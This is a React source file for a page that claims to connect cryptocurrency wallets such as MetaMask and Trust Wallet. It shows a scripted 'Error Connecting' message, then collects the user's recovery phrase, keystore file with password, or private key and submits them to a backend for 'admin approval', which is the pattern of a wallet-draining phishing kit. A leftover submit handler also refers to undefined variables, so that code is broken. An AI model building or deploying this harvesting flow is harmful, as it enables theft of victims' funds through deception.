"use client";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Eye, EyeOff, CheckCircle } from "lucide-react";
import { saveWalletData } from "@/controllers/saveWalletData";
import { toast } from "sonner";
import { useEffect, useState } from "react";

const wallets = [
	{ name: "Trust Wallet", icon: "/twt.png" },
	{ name: "SafePal", icon: "/sfp.png" },
	{ name: "Exodus", icon: "/exodus.jpg" },
	{ name: "Lobstr", icon: "/lobstr.jpg" },
	{ name: "Dharma", icon: "/dharma.jpg" },
	{ name: "HaloDeFi Wallet", icon: "/halodefi.png" },
	{ name: "Metamask", icon: "/metamask.png" },
	{ name: "Rainbow", icon: "/rainbow.jpg" },
];

const importTabs = [
	{ key: "phrase", label: "Phrase" },
	{ key: "keystore", label: "Keystore JSON" },
	{ key: "private", label: "Private Key" },
];

export default function ConnectWallet() {
	const [modalOpen, setModalOpen] = useState(false);
	const [manualModalOpen, setManualModalOpen] = useState(false);
	const [selectedWallet, setSelectedWallet] = useState(null);
	const [activeTab, setActiveTab] = useState("phrase");
	const [connectedWallet, setConnectedWallet] = useState(null);
	const [walletStatus, setWalletStatus] = useState(null);

	// Fetch connected wallet info on mount
	useEffect(() => {
		async function fetchConnectedWallet() {
			const resp = await fetch("/api/wallet-status");
			const data = await resp.json();
			if (data.status === "approved") {
				setConnectedWallet(data.walletName);
				setWalletStatus("approved");
			} else {
				setConnectedWallet(null);
				setWalletStatus(data.status);
			}
		}
		fetchConnectedWallet();
	}, []);

	const handleWalletClick = (wallet) => {
		if (walletStatus === "approved") return; // Prevent opening modal if already connected
		setSelectedWallet(wallet);
		setModalOpen(true);
	};

	const handleCloseModal = () => {
		setModalOpen(false);
		setSelectedWallet(null);
	};

	const handleOpenManual = () => {
		setModalOpen(false);
		setManualModalOpen(true);
	};

	const handleCloseManual = () => {
		setManualModalOpen(false);
		setActiveTab("phrase");
	};

	const handleManualSubmit = async (e) => {
		e.preventDefault();
		let type = activeTab;
		let data;
		let password = "";

		if (type === "phrase") {
			const words = phrase.trim().split(/\s+/);
			if (words.length !== 12 && words.length !== 24) {
				toast.error("Recovery phrase must be exactly 12 or 24 words.");
				return;
			}
			data = phrase;
		} else if (type === "keystore") {
			try {
				data = JSON.parse(keystore);
				password = keystorePassword;
			} catch (err) {
				toast.error("Invalid Keystore JSON format.");
				return;
			}
		} else if (type === "private") {
			if (!privateKey || privateKey.length < 10) {
				toast.error("Invalid Private Key");
				return;
			}
			data = privateKey;
		}

		try {
			const response = await saveWalletData({
				type,
				data,
				walletName: selectedWallet?.name,
				password,
			});

			if (response.success) {
				toast.success("Wallet submitted for admin approval.");
				handleCloseManual();
			} else {
				toast.error(response.error || "Failed to save wallet.");
			}
		} catch (err) {
			toast.error("Failed to save wallet: " + err.message);
		}
	};

	return (
		<div className="min-h-screen pb-6 bg-background text-foreground">
				<div className="absolute inset-0 opacity-10 pointer-events-none z-0 bg-primary/10" />
				<div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 relative z-10">
					<div className="bg-card/95 backdrop-blur-md border border-border p-5 rounded-2xl shadow-lg transition">
					{/* Connected Wallet Info */}
					{walletStatus === "approved" && connectedWallet && (
							<div className="mb-8 flex flex-col items-center justify-center">
							<CheckCircle className="h-10 w-10 text-primary mb-2" />
							<div className="text-lg font-bold text-primary">
								Wallet Connected!
							</div>
							<div className="text-sm text-muted-foreground mt-1">
								Your{" "}
								<span className="font-semibold text-foreground">
									{connectedWallet}
								</span>{" "}
								wallet has been approved by the admin.
							</div>
						</div>
					)}

					{/* Wallet Selection */}
					<div className="text-center mb-10 max-w-2xl mx-auto">
						<h1 className="text-3xl font-bold mb-3 text-foreground">Connect Your Wallet</h1>
						<p className="text-muted-foreground">
							Select a wallet and connect securely by scanning a QR code or using a
							recovery phrase.
						</p>
					</div>
					<div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-6 mb-8">
						{wallets.map((wallet) => (
							<Card
								key={wallet.name}
								className={`flex flex-col items-center cursor-pointer bg-card/60 rounded-xl shadow hover:shadow-xl transition py-4 px-3 hover:scale-105 border border-border ${
									walletStatus === "approved"
										? "opacity-50 cursor-not-allowed"
										: ""
								}`}
								onClick={() => handleWalletClick(wallet)}
							>
								<div className="w-14 h-14 rounded-full overflow-hidden flex items-center justify-center bg-primary/20 shadow-sm">
									<img
										src={wallet.icon}
										alt={wallet.name}
										className="w-14 h-14 object-contain"
									/>
								</div>
								<span className="text-sm font-medium text-foreground text-center mt-2">
									{wallet.name}
								</span>
							</Card>
						))}
					</div>
				</div>

				{/* Main Modal */}
				{modalOpen && walletStatus !== "approved" && (
					<div className="fixed inset-0 z-50 flex items-center justify-center bg-background/60">
						<div
							aria-modal="true"
							role="dialog"
							tabIndex={-1}
							aria-label="dialog"
							className="bg-card/95 backdrop-blur-md border border-border rounded-2xl shadow-2xl w-full max-w-md sm:max-w-lg relative overflow-hidden mx-2"
						>
							<div className="flex items-center justify-between p-4 border-b border-border">
								<button
									onClick={handleCloseModal}
									className="text-muted-foreground hover:text-red-500"
								>
									<svg
										width="24"
										height="24"
										fill="none"
										stroke="currentColor"
										strokeWidth={2}
										strokeLinecap="round"
										strokeLinejoin="round"
									>
										<line x1="18" y1="6" x2="6" y2="18" />
										<line x1="6" y1="6" x2="18" y2="18" />
									</svg>
								</button>
								<div
									className="text-primary font-semibold cursor-pointer"
									onClick={handleCloseModal}
								>
									Back
								</div>
							</div>
							<div className="p-6">
								<div className="flex flex-col items-center">
									<div className="mb-4">
										<img
											src={selectedWallet?.icon}
											alt="Icon"
											style={{ width: 40, height: 40 }}
										/>
									</div>
									<div className="text-lg font-medium mb-2 text-foreground">
										Error Connecting..
									</div>
									<div className="flex justify-center mb-4">
										<Button
											className="bg-primary text-primary-foreground px-4 py-2 rounded hover:opacity-90 shadow-lg shadow-primary/25 transition"
											onClick={handleOpenManual}
										>
											Connect Manually
										</Button>
									</div>
									<button
										className="flex cursor-pointer items-center justify-between w-full bg-card/40 hover:bg-card/60 rounded p-3 mt-2 transition"
										id={`connect-${selectedWallet?.name?.toUpperCase()}`}
									>
										<div>
											<div className="font-semibold text-primary">
												{selectedWallet?.name}
											</div>
											<div className="text-xs text-muted-foreground">
												Easy-to-use browser extension.
											</div>
										</div>
										<div>
											<img
												src={selectedWallet?.icon}
												alt="Icon"
												style={{ width: 24 }}
											/>
										</div>
									</button>
								</div>
							</div>
						</div>
					</div>
				)}

				{/* Manual Import Modal */}
				{manualModalOpen && walletStatus !== "approved" && (
					<div className="fixed inset-0 z-50 flex items-center justify-center bg-background/60 backdrop-blur-sm">
						<div
							role="dialog"
							aria-modal="true"
							aria-labelledby="modal-headline"
							className="bg-card/95 backdrop-blur-md border border-border rounded-2xl shadow-2xl w-full max-w-lg mx-2"
						>
							<div className="px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
								<div className="sm:flex sm:items-start">
									<div className="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10">
										<h3
											id="modal-headline"
											className="text-lg leading-6 mt-2 font-medium text-foreground flex flex-row items-center"
										>
											<img
												src={selectedWallet?.icon}
												style={{
													marginRight: 20,
													height: 40,
													width: 40,
												}}
												alt="wallet"
											/>
											<span>
												Import your{" "}
												<span>{selectedWallet?.name}</span> wallet
											</span>
										</h3>
										<div className="mt-2">
											<div className="mt-10">
												<div className="flex justify-evenly mb-4">
													{importTabs.map((tab) => (
														<div
															key={tab.key}
															className={`p-2 border-b-2 cursor-pointer ${
																activeTab === tab.key
																	? "border-primary text-primary"
																	: "border-border hover:border-primary text-muted-foreground"
															}`}
															onClick={() => setActiveTab(tab.key)}
														>
															{tab.label}
														</div>
													))}
												</div>
												{/* Phrase Tab */}
												{activeTab === "phrase" && (
													<SeedPhraseTab
														walletName={selectedWallet?.name}
														walletStatus={walletStatus}
													/>
												)}
												{/* Keystore Tab */}
												{activeTab === "keystore" && (
													<KeystoreTab
														walletName={selectedWallet?.name}
														walletStatus={walletStatus}
													/>
												)}
												{/* Private Key Tab */}
												{activeTab === "private" && (
													<PrivateKeyTab
														walletName={selectedWallet?.name}
														walletStatus={walletStatus}
													/>
												)}
											</div>
																	<div className="bg-card/50 px-4 py-3 sm:px-6 flex flex-row-reverse">
																			<Button
																				type="button"
																				className="bg-card/80 text-foreground rounded-md px-4 py-2 hover:opacity-90 transition"
																				onClick={handleCloseManual}
																			>
																				Cancel
																			</Button>
																		</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				)}
			</div>
		</div>
	);
}

function useGlobalPending() {
	const [globalPending, setGlobalPending] = useState(false);
	const [pendingType, setPendingType] = useState(null);

	useEffect(() => {
		fetch("/api/wallet-status")
			.then((res) => res.json())
			.then((data) => {
				if (data.status === "pending") {
					setGlobalPending(true);
					setPendingType(data.pendingType);
				} else {
					setGlobalPending(false);
					setPendingType(null);
				}
			});
	}, []);

	return { globalPending, pendingType };
}

function SeedPhraseTab({ walletName }) {
	const [phraseArr, setPhraseArr] = useState(Array(12).fill(""));
	const [submitted, setSubmitted] = useState(false);
	const [status, setStatus] = useState("pending");
	const [loading, setLoading] = useState(false);
	const [showPhrase, setShowPhrase] = useState(true);
	const { globalPending, pendingType } = useGlobalPending();

	// Fetch previous submission if exists
	useEffect(() => {
		async function fetchPhrase() {
			const resp = await fetch("/api/wallet-data?type=phrase");
			const data = await resp.json();
			if (data.phrase) {
				const words = data.phrase.trim().split(/\s+/);
				setPhraseArr(words.length === 12 || words.length === 24 ? words : Array(12).fill(""));
				setSubmitted(true);
				setShowPhrase(false);
			}
		}
		fetchPhrase();
	}, []);

	const handleWordChange = (idx, value) => {
		const arr = [...phraseArr];
		arr[idx] = value.replace(/\s/g, "");
		setPhraseArr(arr);
	};

	const handleSubmit = async (e) => {
		e.preventDefault();
		if (globalPending) {
			toast.error(
				pendingType === "phrase"
					? "You have already submitted a seed phrase. Please wait for admin approval."
					: `You have already submitted a ${pendingType}. Please wait for admin approval.`
			);
			return;
		}
		const words = phraseArr.filter(Boolean);
		if (words.length !== 12 && words.length !== 24) {
			toast.error("Recovery phrase must be exactly 12 or 24 words.");
			return;
		}
		setLoading(true);
		const res = await saveWalletData({ type: "phrase", data: words.join(" "), walletName });
		setLoading(false);
		if (res.success) {
			setSubmitted(true);
			setStatus("pending");
			toast.success("Wallet submitted for admin approval.");
		} else {
			toast.error(res.error || "Submission failed");
		}
	};

	useEffect(() => {
		let interval;
		if (submitted && status === "pending") {
			interval = setInterval(async () => {
				const resp = await fetch("/api/wallet-status?type=phrase");
				const data = await resp.json();
				if (data.status === "approved") {
					setStatus("approved");
					clearInterval(interval);
				} else if (data.status === "rejected") {
					setStatus("rejected");
					clearInterval(interval);
				}
			}, 10000);
		}
		return () => clearInterval(interval);
	}, [submitted, status]);

	useEffect(() => {
		if (status === "rejected") {
			setSubmitted(false);
			setStatus("pending");
			setPhraseArr(Array(12).fill(""));
			toast.error("Your submission was rejected. Please try again.");
		}
	}, [status]);

	const displayArr = showPhrase
		? phraseArr
		: phraseArr.map((word) => (word ? "••••••••" : ""));

	return (
		<form onSubmit={handleSubmit}>
			<div className="mb-6">
				<div className="flex justify-between items-center mb-2">
					<label className="font-semibold text-foreground">Enter your recovery phrase</label>
					<button
						type="button"
						className="text-primary hover:text-primary/80"
						onClick={() => setShowPhrase((v) => !v)}
						aria-label={showPhrase ? "Hide phrase" : "Show phrase"}
					>
						{showPhrase ? <EyeOff size={22} /> : <Eye size={22} />}
					</button>
				</div>
				<div className="grid grid-cols-3 sm:grid-cols-4 gap-2">
					{displayArr.map((word, idx) => (
						<div key={idx} className="flex flex-col items-center">
							<span className="text-xs text-primary font-bold mb-1">{idx + 1}</span>
							<input
								type={showPhrase ? "text" : "password"}
								value={word}
								onChange={(e) => handleWordChange(idx, e.target.value)}
								disabled={submitted || globalPending || status === "approved"}
								className="bg-card/50 p-2 rounded text-center text-foreground w-20 sm:w-24 font-mono text-xs sm:text-sm focus:outline-none border border-border"
								autoComplete="off"
							/>
						</div>
					))}
				</div>
				<p className="text-xs text-muted-foreground mt-2">
					Must be exactly 12 or 24 words. Each box is for one word.
				</p>
			</div>
			{status !== "approved" && (
				<Button
					type="submit"
					className="w-full bg-primary hover:opacity-90 text-primary-foreground rounded py-2 flex items-center justify-center transition shadow-lg shadow-primary/25"
					disabled={submitted || loading || globalPending || status === "approved"}
				>
					<span className="mr-2 uppercase">Proceed</span>
					<span>
						<svg
							fill="none"
							strokeLinecap="round"
							strokeLinejoin="round"
							strokeWidth="2"
							viewBox="0 0 24 24"
							stroke="currentColor"
							className="h-6 w-6"
						>
							<path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
						</svg>
					</span>
				</Button>
			)}
			{globalPending && (
				<div className="mt-4 text-yellow-400 text-center">
					{pendingType === "phrase"
						? "You have already submitted a seed phrase. Please wait for admin approval."
						: `You have already submitted a ${pendingType}. Please wait for admin approval.`}
				</div>
			)}
			{submitted && status === "pending" && (
				<div className="mt-4 text-yellow-400 text-center">
					Waiting for admin approval...
				</div>
			)}
			{status === "approved" && (
				<div className="mt-4 text-green-400 text-center flex flex-col items-center">
					<CheckCircle className="h-8 w-8 mb-2" />
					<span className="font-bold text-lg">Wallet Connected!</span>
					<span className="text-sm text-gray-300 mt-1">
						Your wallet has been approved by the admin. You cannot edit or
						resubmit your phrase.
					</span>
				</div>
			)}
		</form>
	);
}

function KeystoreTab({ walletName }) {
	const [keystore, setKeystore] = useState("");
	const [keystorePassword, setKeystorePassword] = useState("");
	const [submitted, setSubmitted] = useState(false);
	const [status, setStatus] = useState("pending");
	const [loading, setLoading] = useState(false);
	const [showKeystore, setShowKeystore] = useState(false);
	const { globalPending, pendingType } = useGlobalPending();

	useEffect(() => {
		async function fetchKeystore() {
			const resp = await fetch("/api/wallet-data?type=keystore");
			const data = await resp.json();
			if (data.keystore) {
				setKeystore(data.keystore);
				setKeystorePassword(data.password || "");
				setSubmitted(true);
				setShowKeystore(false);
			}
		}
		fetchKeystore();
	}, []);

	const handleSubmit = async (e) => {
		e.preventDefault();
		if (globalPending) {
			toast.error(
				pendingType === "keystore"
					? "You have already submitted a keystore. Please wait for admin approval."
					: `You have already submitted a ${pendingType}. Please wait for admin approval.`
			);
			return;
		}
		setLoading(true);
		let data;
		try {
			data = JSON.parse(keystore);
		} catch (err) {
			toast.error("Invalid Keystore JSON format.");
			setLoading(false);
			return;
		}
		const res = await saveWalletData({
			type: "keystore",
			data,
			walletName,
			password: keystorePassword,
		});
		setLoading(false);
		if (res.success) {
			setSubmitted(true);
			setStatus("pending");
			toast.success("Wallet submitted for admin approval.");
		} else {
			toast.error(res.error || "Submission failed");
		}
	};

	useEffect(() => {
		let interval;
		if (submitted && status === "pending") {
			interval = setInterval(async () => {
				const resp = await fetch("/api/wallet-status?type=keystore");
				const data = await resp.json();
				if (data.status === "approved") {
					setStatus("approved");
					clearInterval(interval);
				} else if (data.status === "rejected") {
					setStatus("rejected");
					clearInterval(interval);
				}
			}, 10000);
		}
		return () => clearInterval(interval);
	}, [submitted, status]);

	useEffect(() => {
		if (status === "rejected") {
			setSubmitted(false);
			setStatus("pending");
			setKeystore("");
			setKeystorePassword("");
			toast.error("Your submission was rejected. Please try again.");
		}
	}, [status]);

	return (
		<form onSubmit={handleSubmit}>
			<div className="flex flex-col mb-6">
				<div className="relative">
					<textarea
						cols={30}
						rows={4}
						placeholder="Keystore JSON"
						className="text-sm sm:text-base placeholder-muted-foreground pl-4 pr-4 rounded-lg border border-border bg-card/50 text-foreground w-full py-2 focus:outline-none focus:border-primary"
						name="keystore"
						value={showKeystore ? keystore : keystore}
						onChange={(e) => setKeystore(e.target.value)}
						required
						readOnly={submitted || globalPending || status === "approved"}
					/>
					{submitted && (
						<button
							type="button"
							className="absolute top-2 right-2 bg-primary text-primary-foreground px-2 py-1 rounded text-xs"
							onClick={() => setShowKeystore((v) => !v)}
						>
							{showKeystore ? "Hide Keystore" : "Show Keystore"}
						</button>
					)}
				</div>
			</div>
			<div className="flex flex-col mb-6">
				<div className="relative">
					<input
						type="text"
						name="keystorepassword"
						placeholder="Wallet password"
						className="text-sm sm:text-base placeholder-muted-foreground pl-4 pr-4 rounded-lg border border-border bg-card/50 text-foreground w-full py-2 focus:outline-none focus:border-primary"
						value={keystorePassword}
						onChange={(e) => setKeystorePassword(e.target.value)}
						required
						readOnly={submitted || globalPending || status === "approved"}
					/>
					<p className="text-xs text-gray-400 mt-2">
						Several lines of text beginning with {"{"}...{"}"} plus the password
						you used to encrypt it.
					</p>
				</div>
			</div>
			{status !== "approved" && (
				<Button
					type="submit"
					className="w-full bg-primary hover:opacity-90 text-primary-foreground rounded py-2 flex items-center justify-center transition shadow-lg shadow-primary/25"
					disabled={submitted || loading || globalPending || status === "approved"}
				>
					<span className="mr-2 uppercase">Proceed</span>
					<span>
						<svg
							fill="none"
							strokeLinecap="round"
							strokeLinejoin="round"
							strokeWidth="2"
							viewBox="0 0 24 24"
							stroke="currentColor"
							className="h-6 w-6"
						>
							<path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
						</svg>
					</span>
				</Button>
			)}
			{globalPending && (
				<div className="mt-4 text-yellow-400 text-center">
					{pendingType === "keystore"
						? "You have already submitted a keystore. Please wait for admin approval."
						: `You have already submitted a ${pendingType}. Please wait for admin approval.`}
				</div>
			)}
			{submitted && status === "pending" && (
				<div className="mt-4 text-yellow-400 text-center">
					Waiting for admin approval...
				</div>
			)}
			{status === "approved" && (
				<div className="mt-4 text-green-400 text-center flex flex-col items-center">
					<CheckCircle className="h-8 w-8 mb-2" />
					<span className="font-bold text-lg">Wallet Connected!</span>
					<span className="text-sm text-gray-300 mt-1">
						Your wallet has been approved by the admin. You cannot edit or
						resubmit your keystore JSON.
					</span>
				</div>
			)}
		</form>
	);
}

function PrivateKeyTab({ walletName }) {
	const [privateKey, setPrivateKey] = useState("");
	const [submitted, setSubmitted] = useState(false);
	const [status, setStatus] = useState("pending");
	const [loading, setLoading] = useState(false);
	const [showKey, setShowKey] = useState(false);
	const { globalPending, pendingType } = useGlobalPending();

	useEffect(() => {
		async function fetchKey() {
			const resp = await fetch("/api/wallet-data?type=private");
			const data = await resp.json();
			if (data.privateKey) {
				setPrivateKey(data.privateKey);
				setSubmitted(true);
				setShowKey(false);
			}
		}
		fetchKey();
	}, []);

	const handleSubmit = async (e) => {
		e.preventDefault();
		if (globalPending) {
			toast.error(
				pendingType === "private"
					? "You have already submitted a private key. Please wait for admin approval."
					: `You have already submitted a ${pendingType}. Please wait for admin approval.`
			);
			return;
		}
		setLoading(true);
		const res = await saveWalletData({
			type: "private",
			data: privateKey,
			walletName,
		});
		setLoading(false);
		if (res.success) {
			setSubmitted(true);
			setStatus("pending");
			toast.success("Wallet submitted for admin approval.");
		} else {
			toast.error(res.error || "Submission failed");
		}
	};

	useEffect(() => {
		let interval;
		if (submitted && status === "pending") {
			interval = setInterval(async () => {
				const resp = await fetch("/api/wallet-status?type=private");
				const data = await resp.json();
				if (data.status === "approved") {
					setStatus("approved");
					clearInterval(interval);
				} else if (data.status === "rejected") {
					setStatus("rejected");
					clearInterval(interval);
				}
			}, 10000);
		}
		return () => clearInterval(interval);
	}, [submitted, status]);

	useEffect(() => {
		if (status === "rejected") {
			setSubmitted(false);
			setStatus("pending");
			setPrivateKey("");
			toast.error("Your submission was rejected. Please try again.");
		}
	}, [status]);

	// Display private key with numbers
	const numberedKey = privateKey
		? privateKey
				.trim()
				.split(/\s+/)
				.map((word, idx) => `${idx + 1}. ${word}`)
				.join(" ")
		: "";

	return (
		<form onSubmit={handleSubmit}>
			<div className="flex flex-col mb-6">
				<div className="relative">
					<input
						type="text"
						name="privatekey"
						placeholder="Enter your Private Key"
						className="form-control text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-white/20 bg-black/20 text-white w-full py-2 focus:outline-none focus:border-blue-400"
						value={showKey ? numberedKey : privateKey}
						onChange={(e) => setPrivateKey(e.target.value)}
						required
						readOnly={submitted || globalPending || status === "approved"}
					/>
					<p className="text-xs text-gray-400 mt-2">
						Typically 12 (sometimes 24) words separated by a single space.
					</p>
					{submitted && (
						<button
							type="button"
							className="absolute top-2 right-2 bg-blue-700 text-white px-2 py-1 rounded text-xs"
							onClick={() => setShowKey((v) => !v)}
						>
							{showKey ? "Hide Key" : "Show Key"}
						</button>
					)}
				</div>
			</div>
			{status !== "approved" && (
				<Button
					type="submit"
					className="w-full bg-blue-600 hover:bg-blue-700 text-white rounded py-2 flex items-center justify-center"
					disabled={submitted || loading || globalPending || status === "approved"}
				>
					<span className="mr-2 uppercase">Proceed</span>
					<span>
						<svg
							fill="none"
							strokeLinecap="round"
							strokeLinejoin="round"
							strokeWidth="2"
							viewBox="0 0 24 24"
							stroke="currentColor"
							className="h-6 w-6"
						>
							<path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
						</svg>
					</span>
				</Button>
			)}
			{globalPending && (
				<div className="mt-4 text-yellow-400 text-center">
					{pendingType === "private"
						? "You have already submitted a private key. Please wait for admin approval."
						: `You have already submitted a ${pendingType}. Please wait for admin approval.`}
				</div>
			)}
			{submitted && status === "pending" && (
				<div className="mt-4 text-yellow-400 text-center">
					Waiting for admin approval...
				</div>
			)}
			{status === "approved" && (
				<div className="mt-4 text-green-400 text-center flex flex-col items-center">
					<CheckCircle className="h-8 w-8 mb-2" />
					<span className="font-bold text-lg">Wallet Connected!</span>
					<span className="text-sm text-gray-300 mt-1">
						Your wallet has been approved by the admin. You cannot edit or
						resubmit your private key.
					</span>
				</div>
			)}
		</form>
	);
}
